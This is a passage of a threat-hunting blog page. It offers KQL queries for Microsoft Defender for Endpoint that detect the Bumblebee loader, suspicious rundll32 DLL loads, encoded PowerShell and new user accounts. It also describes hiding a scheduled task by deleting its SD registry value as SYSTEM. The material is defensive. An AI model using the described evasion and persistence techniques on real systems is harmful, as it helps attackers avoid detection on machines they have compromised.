FolderPath)| project LoadedDllSHA1 = SHA1, LoadedDllName = FileName, folder, DllCreationTimestamp = Timestamp, DeviceId, DeviceName, DllCreationProcessCommandLine = InitiatingProcessCommandLine, DllCreationProcessCreationTime = InitiatingProcessCreationTime, DllCreationProcessFileName = InitiatingProcessFileName, DllCreationProcessId = InitiatingProcessId, DllCreationProcessSHA1 = InitiatingProcessSHA1, DllCreationProcessParentCreationTime = InitiatingProcessParentCreationTime, DllCreationProcessParentFileName = InitiatingProcessParentFileName, DllCreationProcessParentId = InitiatingProcessParentId) on LoadedDllName, LoadedDllSHA1, folder, DeviceName| project LoadedDllSHA1, LoadedDllName, DllLoadTimestamp, DllCreationTimestamp, DllLoadProcessCommandLine, DllLoadProcessFileName, DllLoadProcessParentFileName, DllCreationProcessCommandLine, DllCreationProcessFileName, DllCreationProcessParentFileName, DeviceName, DllLoadProcessSHA1, DllCreationProcessSHA1, folder, DllLoadProcessCreationTime, DllLoadProcessProcessId, DllLoadProcessParentCreationTime, DllLoadProcessParentId, DllCreationProcessCreationTime, DllCreationProcessId, DllCreationProcessParentCreationTime, DllCreationProcessParentId, DeviceIdThe query is getting relatively CPU heavy at this stage and I am sure that it will be impossible to run in the very large environments, at least in any meaningful time frame. Next, I’d like to try it out so I downloaded a dll file with a normal browser. After downloading the file I launched it with rundll32. exe. Loading the DLL file to start calc. The query should now return the results. And it does. DLL load and creation So the idea of the query is that it is looking for loaded DLL Files from c:\users\*, c:\windows\ or c:\programdata\ folders by the rundll32. exe and regsvr32. exe processes. After the image has been loaded the query filters out all the dll files that have been loaded more than 5 times. Then the results are joined to the file events table, looking for the creation of the DLL file - to reveal the actual process which wrote the file to the disk. After getting the results it’s possible to analyze the process which created the DLL which is helpful when determining if the activity was malicious or not. It would be cool to get more information out of that process, however the query is already CPU heavy so I didn’t want to add anything more to it. I am sure that this can be done more efficiently or that I am overthinking it. I tend to overthink on many of the queries that I create which causes unnecessary bloat. I do enjoy to revisit older queries sometimes and start to make them more efficient. This topic could be analyzed much further but I think this is it for now. Maybe I’ll revisit this sometime in the future. This is now the third post on my blog and so far it has been very enjoyable to write these. I will not be updating the blog once a week in the future, this is just too much fun when getting started. Hopefully someone gets something out of these, although I guess it is enough that I enjoy writing them. I might be moving the finished queries to Github at some stage as they are much easier to handle and copy from there. Especially if I will be continuing this blog for a longer period of time. "
    }, {
    "id": 47,
    "url": "https://threathunt.blog/hunt-for-a-hidden-scheduled-task/",
    "title": "(Trying to) hunt for a hidden scheduled task",
    "body": "2022/04/13 - Microsoft DART released an article yesterday of how the malware known as Tarrask has been using scheduled tasks for defense evasion. This malware has been in use by an APT group known as HAFNIUM, likely most notable known by leveraging the 0-day known as ProxyShell a year ago. The article states that the malware has been able to hide the created scheduled tasks from being seen from the GUI by removing SD value under the registry from the created scheduled task. Removing the value requires SYSTEM level privileges and it should not be enough to run the command in elevated cmd. Because the EDR tools should also be saving the registry modifications this should be relatively easy to spot with the tools. One of the problems is that when you create a new scheduled task with - lets say - PowerShell or schtasks. exe the actual reg keys are not created by these processes. Rather, the registry keys are being written by svchost. exe which makes detecting the actual process which initiated the creation of the scheduled task much harder. This might not be hugely relevant in this particular case, however when looking for anomalies in general from the newly created scheduled tasks this makes it hard. I started testing this by creating a scheduled task with PowerShell. Creating a new scheduled task with PowerShell. Running regedit and checking the registry location for the scheduled tasks it can be verified that the SD value is in-place. SD -key in place for the newly created registry value. Finding the created task can be done in multiple ways with MDE, however here is a way to do it using the registry data. DeviceRegistryEvents| where Timestamp &gt; ago(1h)| where ActionType == @ RegistryKeyCreated | where RegistryKey startswith @ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\ | project Timestamp, DeviceName, ActionType, InitiatingProcessFileName, RegistryKeyThe last project line sets the fields that are being returned by the query. The actual process that creates this registry entry is noted in the InitiatingProcessFileName column. The following picture shows that it is recorded as svchost. exe. Reg key creation. Next, I tried to remove the SD value under the LaunchCalc task using elevated PowerShell. This did fail as stated in the article published by DART. Failing to remove the key as admin. Running the same command as SYSTEM works fine. Removing the SD key as system. No task left in task scheduler GUI. Looking for this event in Defender for Endpoint proved a little bit problematic. Going through all the removed registry keys and values did not yield results. It seems that this might be a decision from Microsoft where the data has been left out. It is understandable that not everything is actually being saved as the amount of data that Microsoft has to handle is absolutely huge. Could also be a mistake in my query of course, which is shared below. DeviceRegistryEvents| where Timestamp &gt; ago(1h)| where PreviousRegistryKey contains  HKEY_LOCAL_MACHINE | where ActionType == 'RegistryKeyDeleted' or ActionType == 'RegistryValueDeleted'When logging back in to the device calc. exe is still being executed as to be expected. With a more mature threat hunting program this likely does not matter much as the anomalies in the scheduled tasks creations are likely being already monitored. There are some issues with this approach, mainly because the process that actually created the scheduled task is not revealed in the advanced hunting data, however this can be worked around with multiple methods. I removed the scheduled task key created to registry using the PowerShell as a system. It seems that this was also not saved in MDE. I removed the GUID based registry key for the task using RegEdit. exe and it was recorded by MDE. Not sure if this could be somehow related to my testing environment but at least this time it seems that the reg mods done as a system did not get recorded.   For further investigation purposes, I also created a new scheduled task as a system. The registry key creation was not recorder from this either, however the creation was saved to the DeviceEvents table and could be found with the following query. DeviceEvents| where Timestamp &gt; ago(1h)| where ActionType == 'ScheduledTaskCreated'When I started to write this post about this little niche I thought that this would be quick and easy. I would have liked to present a query to find the events where the attackers might have been trying to evade the defenses by hiding the scheduled task based persistence. As often is, for some reason it wasn’t as easy as thought and some hiccups were discovered while at it. It seems that either by testing environment is having issues or registry activity using system account is at least not always being saved. Normally, my approach for hunting scheduled tasks (and other persistence for that matter) is divided in two. When hunting, I try to hunt for creation of persistence, however in my opinion it is much more interesting to hunt what the persistent binaries are actually doing after launched. That is more relevant and can reveal the actual activity after the creation, especially if for some reason the creation of a persistence is not being saved. With this kind of proactive threat hunting / monitoring it is possible to spot anomalies by the processes that have been launched as scheduled tasks even if the registry modifications are not always saved. "
    }, {
    "id": 48,
    "url": "https://threathunt.blog/how-to-start-with-host-based-threat-hunting/",
    "title": "How to start with host based threat hunting?",
    "body": "2022/04/10 - How to start with host based threat hunting?When I was first introduced to the threat hunting years back it was somewhat hard for me to grasp all the theory which was available in the internet. I did not have at the time any colleagues who would have had extensive experience from the threat hunting so I was struggling a bit to figure out what should be the concrete hunting steps. Back then, there wasn’t as many github repositories available having such a large number of pre-made queries. I was trying to think how to actually start hunting. First, I started to investigate the capabilities of the tools at hand. At the time, I was working with different kind of EDR tools that did save the important data that could be used to conduct hunts. Almost all the EDR tools did offer at least a basic query feature which allowed to hunt for signs of an attacker. When getting better at hunting I noticed that some of the tools didn’t offer that great query language which started to limit the hunting possibilities. However, many of the EDR tools especially now offers a great query language to be used in hunts. In my experience, both Crowdstrike and Microsoft’s Defender for Endpoint offer GREAT query language - I have been using KQL from Microsoft a lot lately. Crowdstrike is saving the data to Splunk and offers SPL query language. Both are awesome for host based threat hunting. Sysmon is also a GREAT option, if saving the data centrally to an efficient solution like Log Analytics or Splunk - for example. Getting started with Defender for Endpoint: Getting started with the actual query languages can be a daunting task. However, there is a lot of examples in the internet that can be used to get started with the language. Start with easy queries: learn how to query for different kind of cmdlines for example. This is easy and can help you to find the potential adversaries. The following example shows a VERY simple query to look for encoded Power Shell being launched. Keep in mind that this simple query can also return false-positives. Even MDE runs some encoded commands from time to time. DeviceProcessEvents // Set the query lookup time. I like to do this in the queries rather than in the GUI| where Timestamp &gt; ago(14d) // Filter to powershell processes. Use ~ for case-insensitive approach. | where FileName =~  powershell. exe  or FileName =~  pwsh. exe // Filter to processes where the launched processes commandline contains letters  enc . This is to | where ProcessCommandLine contains @ -enc Get familiar with the simpler queries first. The KQL language offers a ton of different ways to query the data and supports great statistical filtering of the data. Continuing with the first example. Get the same data but count how many times an encoded command has been launched on each device. DeviceProcessEvents | where Timestamp &gt; ago(14d) | where FileName =~  powershell. exe  or FileName =~  pwsh. exe | where ProcessCommandLine contains @ -enc | summarize count() by DeviceNameAfter the basicsMany blog posts are discussing different methodology that can be used within threat hunting and those are GREAT resources for generating the threat hunting process and methodology. However, more concrete data helped me to get started before moving on to more hypotheses driven approach. I love the Mitre ATT&amp;CK matrix. It offers details on many relevant techniques that are being used in the real world by many attackers. It also offers examples of how different APT groups might have been using different techniques in the past. To me, Mitre ATT&amp;CK has been a basis of many hunting queries targeting the techniques used by the actual attackers. Image from Mitre ATT&amp;CK website, https://attack. mitre. org/. DeviceProcessEvents | where Timestamp &gt; ago(14d) | where ProcessCommandLine contains  /add MDE does also save the account creation event to the DeviceEvents -table (which includes a ton of interesting events proving additional value - like named pipes). This can be queried with the following query: DeviceEvents | where Timestamp &gt; ago(14d) | where ActionType == 'UserAccountCreated'This example has been extremely simple, only stating how you can get started with creating usable queries targeting a Mitre technique. When understanding the KQL better it makes it much easier to create more elaborate queries and to target “the harder to catch” -techniques. In the end, the focus should be on the techniques that are hard to catch with SIEM / MDE detection rules - if the created query is not very noisy then it should likely be turned into detection rule instead. Although I am often creating hunting queries for more comprehensive hypothesis, I am still using Mitre ATT&amp;CK on almost a daily basis to investigate which techniques are relevant and should be hunted for. I am almost always mapping the queries that I ran against Mitre ATT&amp;CK. In the future, the blog will likely contain a lot more complex and interesting queries. It’s likely that I will at some stage open up my method of creating queries and testing them out little more. I might be also writing about the methodology that I use in the hunting - or not. That subject is quite well covered already. Also, my background in incident response so I ight post some tidbits of information from that front as well. "
    }];

var idx = lunr(function () {
    this.ref('id')
    this.field('title')
    this.field('body')

    documents.forEach(function (doc) {
        this.add(doc)
    }, this)
});


    
function lunr_search(term) {
    $('#lunrsearchresults').show( 1000 );
    $( "body" ).addClass( "modal-open" );
    
    document.getElementById('lunrsearchresults').innerHTML = '<div id="resultsmodal" class="modal fade show d-block"  tabindex="-1" role="dialog" aria-labelledby="resultsmodal"> <div class="modal-dialog shadow-lg" role="document"> <div class="modal-content"> <div class="modal-header" id="modtit"> <button type="button" class="close" id="btnx" data-dismiss="modal" aria-label="Close"> &times; </button> </div> <div class="modal-body"> <ul class="mb-0"> </ul>    </div> <div class="modal-footer"><button id="btnx" type="button" class="btn btn-secondary btn-sm" data-dismiss="modal">Close</button></div></div> </div></div>';
    if(term) {
        document.getElementById('modtit').innerHTML = "<h5 class='modal-title'>Search results for '" + term + "'</h5>" + document.getElementById('modtit').innerHTML;
        //put results on the screen.
        var results = idx.search(term);
        if(results.length>0){
            //console.log(idx.search(term));
            //if results
            for (var i = 0; i < results.length; i++) {
                // more statements
                var ref = results[i]['ref'];
                var url = documents[ref]['url'];
                var title = documents[ref]['title'];
                var body = documents[ref]['body'].substring(0,160)+'...';
                document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML + "<li class='lunrsearchresult'><a href='" + url + "'><span class='title'>" + title + "</span><br /><small><span class='body'>"+ body +"</span><br /><span class='url'>"+ url +"</span></small></a></li>";
            }
        } else {
            document.querySelectorAll('#lunrsearchresults ul')[0].innerHTML = "<li class='lunrsearchresult'>Sorry, no results found. Close & try a different search!</li>";
        }
    }
    return false;
}
</script>
<style>
    .lunrsearchresult .title {color: #d9230f;}
    .lunrsearchresult .url {color: silver;}
    .lunrsearchresult a {display: block; color: #777;}
    .lunrsearchresult a:hover, .lunrsearchresult a:focus {text-decoration: none;}
    .lunrsearchresult a:hover .title {text-decoration: underline;}
</style>




<form class="bd-search hidden-sm-down" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
<input type="text" class="form-control text-small"  id="lunrsearch" name="q" value="" placeholder="Type keyword and enter..."> 
</form>
            </ul>
        </div>
    </div>
    </nav>

    <!-- Search Results -->
    <div id="lunrsearchresults">
        <ul class="mb-0"></ul>
    </div>

    <!-- Content -->
    <main role="main" class="site-content">
        
<div class="container">
<div class="jumbotron jumbotron-fluid mb-3 pl-0 pt-0 pb-0 bg-white position-relative">
		<div class="h-100 tofront">
			<div class="row  justify-content-between ">
				<div class=" col-md-6  pr-0 pr-md-4 pt-4 pb-4 align-self-center">
					<p class="text-uppercase font-weight-bold">
                        <span class="catlist">
						
                          <a class="sscroll text-danger" href="/categories.html#threat hunting">threat hunting</a><span class="sep">, </span>
                        
                        </span>
					</p>
					<h1 class="display-4 mb-4 article-headline">Bzz.. Bzz.. Bumblebee loader</h1>
					<div class="d-flex align-items-center">
                        
                        <img class="rounded-circle" src="/assets/images/jouniavatar.jpg" alt="Jouni" width="70"/>
                        
						<small class="ml-3"> Jouni <span><a target="_blank" href="" class="btn btn-outline-success btn-sm btn-round ml-1">Follow</a></span>
                            <span class="text-muted d-block mt-1">May 08, 2022 · <span class="reading-time">
  
  
    5 mins read
  
</span>
    </span>
						</small>
					</div>
				</div>
                
				<div class="col-md-6 pr-0 align-self-center">
					<img class="rounded" src="/assets/images/bumblee_loader.png" alt="Bzz.. Bzz.. Bumblebee loader">
				</div>
                
			</div>
		</div>
	</div>
</div>





<div class="container-lg pt-4 pb-4">
	<div class="row justify-content-center">
        
        
        <!-- Share -->
		<div class="col-lg-2 pr-4 mb-4 col-md-12">
			<div class="sticky-top sticky-top-offset text-center">
				<div class="text-muted">
					Share this
				</div>
				<div class="share d-inline-block">
					<!-- AddToAny BEGIN -->
					<div class="a2a_kit a2a_kit_size_32 a2a_default_style">
						<a class="a2a_dd" href="https://www.addtoany.com/share"></a>
						<a class="a2a_button_facebook"></a>
						<a class="a2a_button_twitter"></a>
					</div>
					<script async src="https://static.addtoany.com/menu/page.js"></script>
					<!-- AddToAny END -->
				</div>
			</div>
		</div>
        
        
		<div class="col-md-12 col-lg-8">
            
            <!-- Article -->
			<article class="article-post">                
			<p>Quite recently, a new loader has been popping up. This loader is likely been developed to counter the Microsoft’s change to the macro behavior, as the macros will be disabled on the documents that have been downloaded from the internet. This is a very welcome change as macros have been often used by the threat actors to launch the malicious code from the maldocs. Now that this will be harder to the threat actors they are creating new creative ways to get the initial foothold after a phishing attack.</p>

<p>One of the new ways that has been observed in the wild is the <a href="https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming">bumblebee loader.</a> This new loader will be delivered in format of an attachment, or a link within a phishing email. The user is then directed to a legitimate web service (for example, one drive) from which the user downloads a password-protected ZIP file, with the password in the email body. The zip contains an ISO file, which then contains two files - .lnk and .dat files. If the lnk file is started the bumblebee loader will be ran from the .dat file. There are several ways how this initial approach could be potentially found with Defender for Endpoint. To me it sounds like that the initial creation of the ISO file joined to the creation of the ZIP file by a browser could be a good approach. This could be maybe joined to network connections too, however it gets a little heavy and I leave it out for now.</p>

<p>So the logic of this query is explained above. I do use the time based join that I’ve used before on an earlier blog post. This is because the process that creates the ISO file is different from the process that created the archive file. Depending on the environment this could potentially need more joins to reduce noise. ISO files are relatively rare in some environments but much more common in the others. Also, this query is only looking for creations of the ISO + archive files - this does not yet mean that anything was executed.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>let lookupWindow = 10min; 
let lookupBin = lookupWindow / 2.0; 
DeviceFileEvents 
| where FileName endswith ".iso"
| where ActionType == 'FileCreated'
| extend TimeKey = bin(Timestamp, lookupBin)
| project DeviceName, IsoCreationTime = Timestamp, IsoCreationFileName = FileName, IsoCreationFolderPath = FolderPath, IsoCreationSHA1 = SHA1, TimeKey, IsoCreationProcessName = InitiatingProcessFileName, IsoCreationProcessCmdline = InitiatingProcessCommandLine, IsoCreationProcessFolderPath = InitiatingProcessFolderPath, IsoCreationParentName = InitiatingProcessParentFileName
| join (
DeviceFileEvents 
| extend ArchiveCreationTime = Timestamp
| where FileName endswith ".zip" or FileName endswith ".rar" or FileName endswith ".7z"
| where InitiatingProcessFileName =~ "chrome.exe" or InitiatingProcessFileName =~ "firefox.exe" or InitiatingProcessFileName =~ "msedge.exe" or InitiatingProcessFileName =~ "iexplore.exe"
| extend TimeKey = range(bin(Timestamp-lookupWindow, lookupBin), bin(Timestamp, lookupBin), lookupBin) 
| mv-expand TimeKey to typeof(datetime)
| project DeviceName, IsoCreationActionType= ActionType, ArchiveCreationTime = Timestamp, ArchiveCreationFileName = FileName, ArchiveCreationFolderPath = FolderPath, ArchiveCreationSHA1 = SHA1, TimeKey, ArchiveCreationProcessName = InitiatingProcessFileName, ArchiveCreationProcessCmdline = InitiatingProcessCommandLine, ArchiveCreationProcessFolderPath = InitiatingProcessFolderPath, ArchiveCreationParentName = InitiatingProcessParentFileName
) on DeviceName, TimeKey
| project DeviceName, IsoCreationTime, IsoCreationFileName, ArchiveCreationFileName, IsoCreationProcessName, IsoCreationActionType, IsoCreationProcessCmdline, IsoCreationProcessFolderPath, ArchiveCreationProcessName, ArchiveCreationProcessCmdline, IsoCreationParentName, ArchiveCreationTime, ArchiveCreationFolderPath, TimeKey, ArchiveCreationProcessFolderPath, ArchiveCreationParentName, IsoCreationFolderPath, IsoCreationSHA1, ArchiveCreationSHA1
</code></pre></div></div>

<p>As you can see from the query, I like to rename some of the fields. This does make it easier at least for me to understand the output especially when joining the data from multiple tables with different process names. I do this almost every time on my queries and I do also suggest it to others as well. The archive creation query is not limited to “FileCreated” events. This is because of how the modern browsers work, as they stage the files with different names and then in the end renames the file to the final format. To test this out I created an empty file with the abbreviation of .ISO. Then I archived the file to a zip file and uploaded to Onedrive - from which I downloaded it and extracted the contents.</p>

<p><img src="/assets/images/iso_archive_creation.png" alt="" />
<em>The query matches the iso and archive creations.</em></p>

<p>The query works. There are multiple matches as there are multiple actions taken on the archive creation query. The default inner unique join takes one random entry from the left and joins it to all matches on right. This could be refined further but I am quite happy with this. One way to limit the results would be to limit the ActionType to “FileRenamed” on the archive creation query. The great article by Proofpoint (already linked before, but again <a href="https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming">here</a>) states the process path after the malicious code is launched. It is basically cmd.exe -&gt; cmd.exe -&gt; rundll32.exe with certain switches. This should be easy enough.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DeviceProcessEvents 
| where InitiatingProcessParentFileName =~ "cmd.exe"
| where InitiatingProcessFileName  =~ "cmd.exe"
| where InitiatingProcessCommandLine contains "IternalJob"
| where InitiatingProcessCommandLine contains "rundll32"
| where FileName =~ "rundll32.exe"
| where ProcessCommandLine contains "IternalJob"
| project Timestamp, DeviceName, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
</code></pre></div></div>

<p>To keep the query efficient I didn’t do any joins. Unfortunately, the cmdline of the parent process is not recorded here so no filtering can be done based on that, unless joining the data. The query does not produce any results in my testing environment but your mileage may vary. I haven’t tested the queries in this post in any production environments yet.</p>

<p>These queries are relatively simple and likely will catch only partial and early versions of the loader, however I think they are a great start. Using these to start and then developing them a little further can produce nice results in catching the new type of loader. This data could of course also be joined further to get less results and to get more information out of the activity.</p>

<p>Also - someone might have noticed that I have changed the theme of the blog. I liked the old one but I migrated to another host as the first one was quite unresponsive at least from Europe. While doing that I changed the theme to handle couple of things better. I think there might be little bug here and there still with this but I will fix them when I get a chance.</p>

<p>EDIT: Fixed a typo in the latter query.</p>
                
			</article>
			
			<!-- Tags -->
			<div class="mb-4">
				<span class="taglist">
				
				  <a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#defender for endpoint">defender for endpoint</a>
				
				  <a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#kql">kql</a>
				
				  <a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#mde">mde</a>
				
				  <a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#threat hunting">threat hunting</a>
				
				  <a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#bumblebee">bumblebee</a>
				
				  <a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#dll loads">dll loads</a>
				
				  <a class="sscroll btn btn-light btn-sm font-weight-bold" href="/tags.html#rundll32">rundll32</a>
				
				</span>
			</div>
 
            <!-- Mailchimp Subscribe Form -->
            
            
            
             <!-- Author Box -->
                				
				<div class="row mt-5">
					<div class="col-md-2 align-self-center">
                         
                        <img class="rounded-circle" src="/assets/images/jouniavatar.jpg" alt="Jouni" width="90"/>
                         
					</div>
					<div class="col-md-10">		
                        <h5 class="font-weight-bold">Written by Jouni </h5>
						Threat hunting nerd.					
					</div>
				</div>				
                
            
            <!-- Comments -->
            
            
		</div>
        
        
	</div>
</div>


<!-- Aletbar Prev/Next -->
<div class="alertbar">
    <div class="container">
        <div class="row prevnextlinks small font-weight-bold">
          
            <div class="col-md-6 rightborder pl-0">
                <a class="text-dark" href="/running-multiple-instances-of-discovery-commands-in-short-period-of-time/"> <img height="30px" class="mr-1" src="/assets/images/output_multi_process.png">  Running multiple instances of discovery commands in short period of time</a>
            </div>
          
          
            <div class="col-md-6 text-right pr-0">
                <a class="text-dark" href="/amsi-bypass-mde-detection/"> AMSI bypass detection with MDE  <img height="30px" class="ml-1" src="/assets/images/ps_with_commands_processes.png"> </a>
            </div>
          
        </div>
    </div>
</div>

    </main>


    <!-- Scripts: popper, bootstrap, theme, lunr -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>

    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js" integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous"></script>

    <script src="/assets/js/theme.js"></script>


    <!-- Footer -->
    <footer class="bg-white border-top p-3 text-muted small">
        <div class="container">
        <div class="row align-items-center justify-content-between">
            <div>
                <span class="navbar-brand mr-2 mb-0"><strong>Threathunt.blog</strong></span>
                <span>Copyright © <script>document.write(new Date().getFullYear())</script>.</span>

                <!--  Github Repo Star Btn-->

            </div>
            <div>
                Made with <a target="_blank" class="text-dark font-weight-bold" href="https://www.wowthemes.net/mundana-jekyll-theme/"> Mundana Jekyll Theme </a> by <a class="text-dark" target="_blank" href="https://www.wowthemes.net">WowThemes</a>.
            </div>
        </div>
        </div>
    </footer>

    <!-- All this area goes before </body> closing tag --> 
<!-- 100% privacy-first analytics -->
<script async src="https://scripts.simpleanalyticscdn.com/latest.js"></script>


</body>

</html>
